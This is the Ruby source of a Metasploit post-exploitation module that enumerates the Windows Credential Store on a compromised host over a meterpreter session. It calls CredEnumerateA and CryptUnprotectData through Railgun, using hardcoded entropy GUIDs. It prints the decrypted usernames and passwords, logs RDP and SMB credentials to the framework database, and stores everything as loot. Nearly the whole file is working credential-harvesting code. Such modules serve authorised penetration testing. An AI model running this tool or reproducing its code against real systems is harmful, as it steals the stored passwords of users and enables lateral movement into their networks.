##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Gather Credential Store Enumeration and Decryption Module",
      'Description'     => %q{
          This module will enumerate the Microsoft Credential Store and decrypt the
        credentials. This module can only access credentials created by the user the
        process is running as.  It cannot decrypt Domain Network Passwords, but will
        display the username and location.
      },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Kx499']
    ))

  end

  #############################
  #RAILGUN HELPER FUNCTIONS
  ############################
  def is_86
    pid = session.sys.process.open.pid
    return session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
  end

  def pack_add(data)
    if is_86
      addr = [data].pack("V")
    else
      addr = [data].pack("Q")
    end
    return addr
  end

  def mem_write(data, length)
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(length)
    process.memory.write(mem, data)
    return mem
  end

  def read_str(address,len,type)
    begin
      pid = session.sys.process.open.pid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
      raw = process.memory.read(address, len)
      if type == 0 #unicode
        str_data = raw.gsub("\x00","")
      elsif type == 1 #null terminated
        str_data = raw.unpack("Z*")[0]
      elsif type == 2 #raw data
        str_data = raw
      end
    rescue
      str_data = nil
    end
    return str_data || "Error Decrypting"
  end

  def decrypt_blob(daddr, dlen, type)
    #type 0 = passport cred, type 1 = wininet cred
    #set up entropy
    c32 = session.railgun.crypt32
    guid = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0" if type == 0
    guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7" if type == 1
    ent_sz = 74
    salt = []
    guid.each_byte do |c|
      salt << c*4
    end
    ent = salt.pack("s*")

    #write entropy to memory
    mem = mem_write(ent,1024)

    #prep vars and call function
    addr = pack_add(daddr)
    len = pack_add(dlen)
    eaddr = pack_add(mem)
    elen = pack_add(ent_sz)

    if is_86
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,8)
      len,add = ret["pDataOut"].unpack("V2")
    else
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
      len,add = ret["pDataOut"].unpack("Q2")
    end

    #get data, and return it
    return "" unless ret["return"]
    return read_str(add, len, 0)
  end

  def gethost(hostorip)
    #check for valid ip and return if it is
    return hostorip if Rex::Socket.dotted_ip?(hostorip)

    #convert hostname to ip and return it
    hostip = nil
    if client.platform =~ /^x64/
      size = 64
      addrinfoinmem = 32
    else
      size = 32
      addrinfoinmem = 24
    end

    ## get IP for host
    begin
      vprint_status("Looking up IP for #{hostorip}")
      result = client.railgun.ws2_32.getaddrinfo(hostorip, nil, nil, 4 )
      if result['GetLastError'] == 11001
        return nil
      end
      addrinfo = client.railgun.memread( result['ppResult'], size )
      ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
      sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
      ip = sockaddr[4,4].unpack('N').first
      hostip = Rex::Socket.addr_itoa(ip)
    rescue ::Exception => e
      print_error(e.to_s)
    end
    return hostip
  end

  def report_db(cred)
    ip_add = nil
    host = ""
    port = 0
    begin
      if cred["targetname"].include? "TERMSRV"
        host = cred["targetname"].gsub("TERMSRV/","")
        port = 3389
      elsif cred["type"] == 2
        host = cred["targetname"]
        port = 445
      else
        return false
      end

      ip_add= gethost(host)

      unless ip_add.nil?
        if session.db_record
          source_id = session.db_record.id
        else
          source_id = nil
        end
        auth = {
          :host => ip_add,
          :port => port,
          :user => cred["username"],
          :pass => cred["password"],
          :type => 'password',
          :source_id => source_id,
          :source_type => "exploit",
          :active => true
        }

        report_auth_info(auth)
        print_status("Credentials for #{ip_add} added to db")
      else
        return
      end
    rescue ::Exception => e
      print_error("Error adding credential to database for #{cred["targetname"]}")
      print_error(e.to_s)
    end
  end

  def get_creds
    credentials = []
    #call credenumerate to get the ptr needed
    adv32 = session.railgun.advapi32
    ret = adv32.CredEnumerateA(nil,0,4,4)
    p_to_arr = ret["Credentials"].unpack("V")
    arr_len = ret["Count"] * 4 if is_86
    arr_len = ret["Count"] * 8 unless is_86

    #tell user what's going on
    print_status("#{ret["Count"]} credentials found in the Credential Store")
    return credentials unless arr_len > 0
    if ret["Count"] > 0
      print_status("Decrypting each set of credentials, this may take a minute...")

      #read array of addresses as pointers to each structure
      raw = read_str(p_to_arr[0], arr_len, 2)
      pcred_array = raw.unpack("V*") if is_86
      pcred_array = raw.unpack("Q*") unless is_86

      #loop through the addresses and read each credential structure
      pcred_array.each do |pcred|
        cred = {}
        raw = read_str(pcred, 52,2)
        cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
        cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
        cred["flags"] = cred_struct[0]
        cred["type"] = cred_struct[1]
        cred["targetname"] = read_str(cred_struct[2],512, 1)
        cred["comment"] = read_str(cred_struct[3],256, 1)
        cred["lastdt"] = cred_struct[4]
        cred["persist"] = cred_struct[7]
        cred["attribcnt"] = cred_struct[8]
        cred["pattrib"] = cred_struct[9]
        cred["targetalias"] = read_str(cred_struct[10],256, 1)
        cred["username"] = read_str(cred_struct[11],513, 1)

        if cred["targetname"].include? "TERMSRV"
          cred["password"] = read_str(cred_struct[6],cred_struct[5],0)
        elsif cred["type"] == 1
          decrypted = decrypt_blob(cred_struct[6],cred_struct[5], 1)
          cred["username"] = decrypted.split(':')[0] || "No Data"
          cred["password"] = decrypted.split(':')[1] || "No Data"
        elsif cred["type"] == 4
          cred["password"] = decrypt_blob(cred_struct[6],cred_struct[5], 0)
        else
          cred["password"] = "unsupported type"
        end
        #only add to array if there is a target name
        unless cred["targetname"] == "Error Decrypting" or cred["password"] == "unsupported type"
          print_status("Credential sucessfully decrypted for: #{cred["targetname"]}")
          credentials << cred
        end
      end
    else
      print_status("No Credential are available for decryption")
    end
    return credentials
  end

  def run
    creds = get_creds
    #store all data to loot if data returned
    if not creds.empty?
      creds.each do |cred|
        credstr = "\t Type: "
        credstr << cred["type"].to_s
        credstr << "  User: "
        credstr << cred["username"]
        credstr << "  Password: "
        credstr << cred["password"]
        print_good(cred["targetname"])
        print_line(credstr)
        #store specific  creds to db
        report_db(cred)
        print_line("")
      end


      print_status("Writing all data to loot...")
      path = store_loot(
        'credstore.user.creds',
        'text/plain',
        session,
        creds,
        'credstore_user_creds.txt',
        'Microsoft Credential Store Contents')
      print_status("Data saved in: #{path}")
    end
  end
end
